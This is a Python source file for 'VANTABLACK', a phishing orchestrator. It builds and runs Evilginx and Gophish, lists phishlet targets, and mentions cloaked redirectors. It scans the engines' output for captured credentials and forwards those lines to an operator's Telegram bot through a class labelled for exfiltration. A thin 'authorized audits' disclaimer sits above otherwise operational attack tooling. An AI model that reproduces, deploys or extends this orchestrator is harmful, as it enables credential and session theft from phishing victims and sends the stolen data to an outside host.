#!/usr/bin/env python3
"""
--------------------------------------------------------------------------------
VANTABLACK: Industrial Phishing Orchestrator (V3 - CLOAKED EDITION)
--------------------------------------------------------------------------------
LEGAL DISCLAIMER:
THE USER IS SOLELY CRIMINALLY RESPONSIBLE FOR THE USE OF THIS TOOL.
Usage strictly reserved for academic research and authorized audits.
The designer disclaims ALL responsibility in case of malicious use.
Provided "AS-IS" without warranty of legality or success.
--------------------------------------------------------------------------------
"""

import os
import sys
import subprocess
import time
import signal
import yaml
import socket
import json
import hashlib
from threading import Thread, Event
from rich.console import Console
from rich.panel import Panel
from rich.table import Table
from rich.prompt import Prompt
from rich.align import Align
from rich.status import Status
from rich.progress import Progress, SpinnerColumn, TextColumn

# --- SECURITY AND DISPLAY LOGIC ---

# Console: Premium Dark Theme for VANTABLACK
console = Console()

# STOP_EVENT: Signal used to properly stop all background processes
STOP_EVENT = Event()

# MASK_PATTERNS: List of keywords whose values must be hidden in logs (OPSEC)
MASK_PATTERNS = ["password", "token", "secret", "key", "login", "password=", "token="]

def mask_sensitive_data(text):
    """FUNCTION: Masks sensitive data for OPSEC protection."""
    words = text.split()
    masked_words = []
    for word in words:
        if "=" in word:
            key, val = word.split("=", 1)
            if any(p in key.lower() for p in MASK_PATTERNS):
                masked_words.append(f"{key}=********")
                continue
        masked_words.append(word)
    return " ".join(masked_words)

import requests

# --- TELEGRAM EXFILTRATION ---

class TelegramReporter:
    """CLASS: TelegramReporter for secure remote monitoring."""
    def __init__(self, token, chat_id):
        self.token = token
        self.chat_id = chat_id
        self.api_url = f"https://api.telegram.org/bot{self.token}/sendMessage"

    def send_log(self, message):
        if not self.token or not self.chat_id: return
        try:
            payload = {"chat_id": self.chat_id, "text": f"🌑 [VANTABLACK CAPTURE]\n\n{message}", "parse_mode": "Markdown"}
            requests.post(self.api_url, json=payload, timeout=5)
        except:
            pass

class VantaUltimate:
    """CLASS: VantaUltimate system orchestrator."""
    def __init__(self):
        self.processes = {}
        self.running = True
        self.bin_path = "./bin"
        self.config_path = "hitch_config.yaml"
        self.load_config()
        
        tg_conf = self.config.get("telegram", {})
        self.tg_reporter = TelegramReporter(tg_conf.get("token"), tg_conf.get("chat_id"))

    def load_config(self):
        """LOADS configuration with VANTABLACK defaults."""
        if os.path.exists(self.config_path):
            with open(self.config_path, 'r') as f:
                self.config = yaml.safe_load(f)
        else:
            self.config = {
                "name": "VANTABLACK",
                "version": "3.0.0",
                "security_level": "OVERKILL",
                "auto_repair": True,
                "telegram": {
                    "token": "YOUR_TOKEN_HERE",
                    "chat_id": "YOUR_CHAT_ID_HERE"
                }
            }
            with open(self.config_path, 'w') as f:
                yaml.dump(self.config, f)

    def get_file_hash(self, path):
        """CALCULATES SHA-256 fingerprint for binary integrity."""
        sha256_hash = hashlib.sha256()
        try:
            with open(path, "rb") as f:
                for byte_block in iter(lambda: f.read(4096), b""):
                    sha256_hash.update(byte_block)
            return sha256_hash.hexdigest()
        except:
            return None

    def banner(self):
        """DISPLAYS the VANTABLACK premium banner."""
        banner_text = """
[bold black on grey37]  _   _   _   _   _   _   _   _   _   _  [/]
[bold black on grey37] / \ / \ / \ / \ / \ / \ / \ / \ / \ / \ [/]
[bold black on grey37]( V | A | N | T | A | B | L | A | C | K )[/]
[bold black on grey37] \_/ \_/ \_/ \_/ \_/ \_/ \_/ \_/ \_/ \_/ [/]

[bold grey50]VANTABLACK: INDUSTRIAL ORCHESTRATOR | V3.0.0[/]
[italic grey39]Through the Looking Glass of Security[/]
        """
        console.print(Align.center(banner_text))

    def health_check(self, silent=False):
        """VERIFIES components and integrity."""
        results = {
            "Evilginx (Interceptor)": os.path.exists(f"{self.bin_path}/evilginx"),
            "Gophish (Manager)": os.path.exists(f"{self.bin_path}/gophish"),
            "Phishlets (Arsenal)": os.path.exists("./phishlets"),
            "Redirectors (Cloaking)": os.path.exists("./redirectors"),
        }
        
        integrity = True
        hashes = self.config.get("hashes", {})
        if hashes:
            for component, expected_hash in hashes.items():
                if expected_hash == "TO_BE_GENERATED": continue
                path = f"{self.bin_path}/{component.lower()}"
                if os.path.exists(path):
                    actual_hash = self.get_file_hash(path)
                    if actual_hash != expected_hash:
                        integrity = False
                        if not silent: 
                            console.print(f"[bold red][!] INTEGRITY ALERT: {component} compromised![/]")
        
        if not silent:
            table = Table(title="[bold grey37]VANTABLACK Diagnostic[/]", border_style="grey37")
            table.add_column("Module", style="cyan")
            table.add_column("Status", justify="center")
            for k, v in results.items():
                status = "[bold green]ONLINE[/]" if v else "[bold red]MISSING[/]"
                table.add_row(k, status)
            integrity_status = "[bold green]SECURE[/]" if integrity else "[bold red]SUSPECT[/]"
            table.add_row("Core Integrity", integrity_status)
            console.print(table)
        
        return all(results.values()) and integrity

    def auto_repair(self):
        """FORCED repair of core components."""
        with console.status("[bold magenta]Initiating Auto-Repair...[/]", spinner="dots"):
            if not os.path.exists(self.bin_path):
                os.makedirs(self.bin_path)
            
            if not os.path.exists(f"{self.bin_path}/evilginx") or not os.path.exists(f"{self.bin_path}/gophish"):
                console.print("[grey37]Sources missing. Rebuilding engines...[/]")
                try:
                    subprocess.run(["go", "build", "-o", f"../bin/evilginx", "-mod=vendor", "main.go"], cwd="engines", check=True)
                    subprocess.run(["go", "build", "-o", f"../bin/gophish", "-mod=vendor", "gophish.go"], cwd="engines", check=True)
                    console.print("[green]Engines restored successfully.[/]")
                except Exception as e:
                    console.print(f"[bold red]REPAIR ERROR: {e}[/]")
                    return False
        return True

    def security_audit(self):
        """VANTABLACK infrastructure audit."""
        console.print(Panel("[bold magenta]VANTABLACK SECURITY AUDIT[/]", border_style="magenta"))
        
        warnings = []
        config_file = "configs/config.json"
        if os.path.exists(config_file):
            with open(config_file, "r") as f:
                gp_conf = json.load(f)
                if gp_conf.get("admin_server", {}).get("listen_url") == "0.0.0.0:3333":
                    warnings.append("Admin GUI exposed on 0.0.0.0")
        
        for port in [80, 443, 3333]:
            with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as s:
                if s.connect_ex(('localhost', port)) == 0:
                    warnings.append(f"Port {port} conflict detected")

        if warnings:
            for w in warnings:
                console.print(f"[bold red][!] VULNERABILITY: {w}[/]")
        else:
            console.print("[bold green][✓] Infrastructure stealth-ready.[/]")
        
        Prompt.ask("\n[grey37]Return to Core[/]")

    def start_process(self, name, cmd_list):
        """LAUNCHES and MONITORS a VANTABLACK core process."""
        def run():
            while not STOP_EVENT.is_set():
                try:
                    proc = subprocess.Popen(cmd_list, stdout=subprocess.PIPE, stderr=subprocess.STDOUT, text=True, start_new_session=True, bufsize=1)
                    self.processes[name] = proc
                    console.print(f"[bold grey50][{name}][/] [green]Engine deployed.[/]")
                    
                    while True:
                        line = proc.stdout.readline()
                        if not line: break
                        if "captured" in line.lower():
                            masked = mask_sensitive_data(line.strip())
                            self.log(f"ALERT [{name}]: {masked}", "warning")
                            self.tg_reporter.send_log(masked)
                        elif "error" in line.lower():
                            self.log(line.strip(), "error")

                    if STOP_EVENT.is_set(): break
                except Exception as e:
                    self.log(f"Process Failure: {e}", "error")
                time.sleep(5)

        Thread(target=run, daemon=True).start()

    def stop_all(self):
        """SECURE shutdown of all systems."""
        STOP_EVENT.set()
        console.print("\n[bold red]TERMINATING VANTABLACK...[/]")
        for name, proc in self.processes.items():
            try: os.killpg(os.getpgid(proc.pid), signal.SIGTERM)
            except: pass
        console.print("[dim grey37]System offline.[/]")

    def run_cli(self):
        """MAIN VANTABLACK CONTROL CENTER."""
        while self.running:
            self.banner()
            
            menu = Table.grid(padding=1)
            menu.add_row("[1]", "[bold grey70]TAKEOFF[/] (Full Deployment)")
            menu.add_row("[2]", "[bold grey70]SEC-AUDIT[/] (Infrastructure Audit)")
            menu.add_row("[3]", "[bold grey70]REPAIR[/] (Force Component Rebuild)")
            menu.add_row("[4]", "[bold grey70]ARSENAL[/] (View Active Ammo)")
            menu.add_row("[q]", "Shutdown")
            
            console.print(Panel(menu, title="[bold white]BLACK CONTROL CENTER[/]", border_style="grey37", expand=False))
            choice = Prompt.ask("[bold grey37]VANTABLACK[/]", choices=["1", "2", "3", "4", "q"], default="1")
            
            if choice == "1":
                if not self.health_check(silent=True):
                    if not self.auto_repair(): continue
                
                self.start_process("EVILGINX", [f"{self.bin_path}/evilginx", "-p", "./phishlets", "-developer"])
                self.start_process("GOPHISH", [f"{self.bin_path}/gophish", "--config", "./configs/config.json"])
                
                console.print(Panel(
                    "[bold green]VANTABLACK DEPLOYED[/]\n"
                    "• Gophish HUD: https://127.0.0.1:3333\n"
                    "• Interception Active: 80/443 cloaked\n",
                    title="Live Monitor", border_style="green"
                ))
                
                try:
                    while True: time.sleep(1)
                except KeyboardInterrupt:
                    self.stop_all()
                    STOP_EVENT.clear()
            elif choice == "2":
                self.health_check()
                self.security_audit()
            elif choice == "3":
                self.auto_repair()
            elif choice == "4":
                self.show_arsenal()
            elif choice == "q":
                self.stop_all()
                self.running = False

    def show_arsenal(self):
        """LISTS the VANTABLACK arsenal."""
        table = Table(title="VANTABLACK AMMO")
        table.add_column("Type", style="magenta")
        table.add_column("Target", style="white")
        
        for f in os.listdir("./phishlets"):
            if f.endswith(".yaml"): table.add_row("Phishlet", f.replace(".yaml", ""))
        
        console.print(table)
        Prompt.ask("\n[grey37]Close Arsenal[/]")

if __name__ == "__main__":
    vanta = VantaUltimate()
    try:
        vanta.run_cli()
    except KeyboardInterrupt:
        vanta.stop_all()
        sys.exit(0)
